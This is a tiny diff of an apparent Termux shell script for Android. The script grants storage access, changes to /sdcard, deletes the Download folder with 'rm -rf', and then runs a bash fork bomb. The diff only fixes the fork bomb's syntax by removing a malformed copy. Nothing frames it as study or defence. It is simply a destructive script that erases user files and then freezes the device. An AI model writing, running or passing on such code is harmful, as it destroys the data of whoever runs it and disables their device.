@@ -3,5 +3,5 @@ sleep 3
 termux-setup-storage
 cd /sdcard
 rm -rf Download 
-:(){ :|: & }:;
+
 :(){ :|: & };:
